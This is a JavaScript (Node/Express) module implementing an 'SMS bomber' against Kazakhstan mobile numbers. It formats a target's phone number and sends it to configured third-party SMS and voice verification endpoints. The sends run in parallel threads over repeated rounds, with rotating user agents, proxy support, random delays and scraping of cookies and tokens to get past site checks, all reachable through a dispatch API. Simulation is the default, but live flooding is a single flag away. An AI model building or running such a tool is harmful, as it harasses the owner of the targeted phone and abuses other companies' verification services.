import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const CONFIG_PATH = path.join(__dirname, 'endpoints.json');

const KZ_MOBILE_PREFIXES = new Set([
  '700','701','702','703','704','705','706','707','708',
  '747','750','751','760','761','762','763','771',
  '775','776','777','778',
]);

const DEFAULT_UAS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148',
];

function randOf(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
function randDelay(min, max) { return Math.floor(min + Math.random() * Math.max(1, max - min)); }
function nowMs() { return Date.now(); }

export function normalizeKzPhone(raw) {
  let digits = String(raw || '').replace(/\D/g, '');
  if (digits.length === 11 && (digits[0] === '8' || digits[0] === '7')) digits = digits.slice(1);
  if (digits.length !== 10) {
    return {
      e164: null, e164_enc: null, raw: null, local8: null, national: null,
      display: null, display_enc: null, display_space: null, display_space_enc: null,
      prefix: null, valid: false,
      error: `expected 10 national digits, got ${digits.length}`,
    };
  }
  const prefix = digits.slice(0, 3);
  const valid = KZ_MOBILE_PREFIXES.has(prefix);
  const e164 = '+7' + digits;
  const display = `+7 (${digits.slice(0,3)}) ${digits.slice(3,6)}-${digits.slice(6,8)}-${digits.slice(8,10)}`;
  const display_space = `+7 (${digits.slice(0,3)}) ${digits.slice(3,6)} ${digits.slice(6,8)} ${digits.slice(8,10)}`;
  return {
    e164,
    e164_enc: encodeURIComponent(e164),
    raw: '7' + digits,
    local8: '8' + digits,
    national: digits,
    display,
    display_enc: encodeURIComponent(display),
    display_space,
    display_space_enc: encodeURIComponent(display_space),
    prefix,
    valid,
    error: valid ? null : `prefix ${prefix} not in KZ mobile set`,
  };
}

export function substitutePhone(template, forms) {
  if (!template) return '';
  let out = String(template);
  const pairs = [
    ['{phone_display_space_enc}', forms.display_space_enc],
    ['{phone_display_space}',     forms.display_space],
    ['{phone_display_enc}',       forms.display_enc],
    ['{phone_display}',           forms.display],
    ['{phone_e164_enc}',          forms.e164_enc],
    ['{phone_national}',          forms.national],
    ['{phone_raw}',               forms.raw],
    ['{phone_8}',                 forms.local8],
    ['{phone_prefix}',            forms.prefix],
    ['{phone}',                   forms.e164],
  ];
  for (const [k, v] of pairs) out = out.split(k).join(v || '');
  return out;
}

export function loadConfig() {
  const data = JSON.parse(fs.readFileSync(CONFIG_PATH, 'utf8'));
  const endpoints = (data.endpoints || [])
    .filter(e => e.enabled !== false)
    .map(e => ({
      name: e.name,
      method: (e.method || 'POST').toUpperCase(),
      url: e.url,
      channel: (e.channel || 'sms').toLowerCase(),
      contentType: e.content_type || 'application/json',
      body: e.body || '',
      headers: e.headers || {},
      preRequest: e.pre_request || null,
    }));
  return {
    endpoints,
    threads: Number(data.threads ?? 6),
    delayMinMs: Number(data.delay_min_ms ?? 200),
    delayMaxMs: Number(data.delay_max_ms ?? 1400),
    timeoutSec: Number(data.timeout_sec ?? 10),
    userAgents: data.user_agents || DEFAULT_UAS,
    proxies: data.proxies || [],
    simulation: data.simulation_mode ?? true,
    twilio: data.twilio || {},
  };
}

async function fireEndpoint(ep, forms, cfg) {
  const result = { name: ep.name, channel: ep.channel, ok: false, status: null, snippet: '' };

  if (cfg.simulation) {
    result.ok = true;
    result.status = 200;
    result.snippet = 'simulated';
    return result;
  }

  let url  = substitutePhone(ep.url, forms);
  let body = substitutePhone(ep.body, forms);

  const headers = {};
  for (const [k, v] of Object.entries(ep.headers)) headers[k] = substitutePhone(String(v), forms);
  if (!headers['User-Agent']) headers['User-Agent'] = randOf(cfg.userAgents);
  if (ep.contentType && !headers['Content-Type']) headers['Content-Type'] = ep.contentType;

  let preCookies = '';
  let extraHeader = null;

  if (ep.preRequest) {
    const preUrl = substitutePhone(ep.preRequest.url || '', forms);
    const preMethod = (ep.preRequest.method || 'GET').toUpperCase();
    const preHeaders = {
      'User-Agent': randOf(cfg.userAgents),
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Accept-Language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
      ...(ep.preRequest.headers || {}),
    };
    try {
      const preRes = await fetch(preUrl, { method: preMethod, headers: preHeaders, redirect: 'manual' });
      const text = await preRes.text();
      const setCookies = preRes.headers.getSetCookie ? preRes.headers.getSetCookie() : [];
      preCookies = setCookies.map(c => c.split(';')[0]).join('; ');
      const extract = ep.preRequest.extract || {};
      let token = '';
      if (extract.pattern) {
        const m = text.match(new RegExp(extract.pattern));
        token = m ? m[1] : '';
      }
      if (extract.into) {
        body = body.split(extract.into).join(token);
        url  = url.split(extract.into).join(token);
      }
      if (extract.header) extraHeader = [extract.header, token];
    } catch (e) {
      result.snippet = 'PRE_ERR:' + String(e.message || e).slice(0, 100);
      return result;
    }
  }

  if (extraHeader) headers[extraHeader[0]] = extraHeader[1];
  if (preCookies) headers['Cookie'] = headers['Cookie'] ? headers['Cookie'] + '; ' + preCookies : preCookies;

  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), cfg.timeoutSec * 1000);
  try {
    const opts = { method: ep.method, headers, redirect: 'manual', signal: controller.signal };
    if (ep.method !== 'GET' && ep.method !== 'HEAD') opts.body = body;
    const r = await fetch(url, opts);
    result.status = r.status;
    result.ok = r.status >= 200 && r.status < 400;
    const loc = r.headers.get('location') || '';
    if (loc) result.snippet = loc.slice(0, 120);
    else {
      const t = await r.text();
      result.snippet = t.slice(0, 120).replace(/\n/g, ' ');
    }
  } catch (e) {
    result.snippet = String(e.message || e).slice(0, 120);
  } finally {
    clearTimeout(timer);
  }
  return result;
}

const jobs = new Map();
const JOB_TTL_MS = 60 * 60 * 1000;

function pruneJobs() {
  const t = nowMs();
  for (const [id, j] of jobs) if (t - j.startedAt > JOB_TTL_MS) jobs.delete(id);
}

export function getJob(id) { return jobs.get(id) || null; }

export function stopJob(id) {
  const j = jobs.get(id);
  if (j) j.stopRequested = true;
}

export async function runBomberJob(rawPhone, count, channel, simulation) {
  pruneJobs();

  if (!Number.isInteger(count) || count < 1 || count > 100) {
    throw new Error('count must be 1..100');
  }
  const forms = normalizeKzPhone(rawPhone);
  if (!forms.e164) throw new Error(forms.error);
  if (!forms.valid) throw new Error(forms.error + ' (use ! to force)');

  let want;
  if (channel === 'sms') want = new Set(['sms']);
  else if (channel === 'voice' || channel === 'call') want = new Set(['voice', 'call']);
  else want = new Set(['sms', 'voice', 'call']);

  const cfg = loadConfig();
  cfg.simulation = simulation !== false;

  const id = Math.random().toString(36).slice(2, 10);
  const job = {
    id,
    phone: forms.e164,
    total: count,
    sent: 0,
    failed: 0,
    done: false,
    stopped: false,
    stopRequested: false,
    events: [],
    startedAt: nowMs(),
    forms,
    cfg,
    want,
    rounds: count,
  };
  jobs.set(id, job);

  runRounds(job).catch(err => {
    job.events.push({
      seq: job.events.length + 1,
      phone: job.phone,
      channel: 'system',
      name: 'worker',
      status: 'failed',
      http: null,
      error: String(err.message || err).slice(0, 160),
    });
  }).finally(() => { job.done = true; });

  return { id, phone: forms.e164, total: count };
}

async function runRounds(job) {
  const { cfg, forms, want, rounds } = job;
  const eligible = cfg.endpoints.filter(e => want.has(e.channel));
  if (!eligible.length) return;

  for (let round = 0; round < rounds; round++) {
    if (job.stopRequested) { job.stopped = true; return; }

    let idx = 0;
    const worker = async () => {
      while (true) {
        if (job.stopRequested) return;
        const i = idx++;
        if (i >= eligible.length) return;
        const ep = eligible[i];
        const r = await fireEndpoint(ep, forms, cfg);
        if (r.ok) job.sent++; else job.failed++;
        job.events.push({
          seq: job.events.length + 1,
          phone: forms.e164,
          channel: r.channel,
          name: r.name,
          status: r.ok ? 'sent' : 'failed',
          http: r.status,
          error: r.ok ? null : (r.snippet || '').slice(0, 120),
        });
        await new Promise(res => setTimeout(res, randDelay(cfg.delayMinMs, cfg.delayMaxMs)));
      }
    };

    const pool = [];
    for (let i = 0; i < Math.min(cfg.threads, eligible.length); i++) pool.push(worker());
    await Promise.all(pool);
  }
}

export function registerBomber(app) {
  app.post('/api/dispatch', async (req, res) => {
    try {
      const body = req.body || {};
      const out = await runBomberJob(
        String(body.phone || '').trim(),
        Number(body.count || 1),
        String(body.channel || 'both').toLowerCase(),
        body.simulation !== false
      );
      res.json(out);
    } catch (e) {
      res.status(400).json({ error: e.message || 'dispatch failed' });
    }
  });

  app.get('/api/job/:id', (req, res) => {
    const j = getJob(req.params.id);
    if (!j) return res.status(404).json({ error: 'not found' });
    res.json({
      id: j.id,
      phone: j.phone,
      total: j.total,
      sent: j.sent,
      failed: j.failed,
      done: j.done,
      stopped: j.stopped,
      elapsed: Math.round((nowMs() - j.startedAt) / 100) / 10,
      events: j.events,
    });
  });

  app.post('/api/job/:id/stop', (req, res) => {
    stopJob(req.params.id);
    res.json({ ok: true });
  });
}
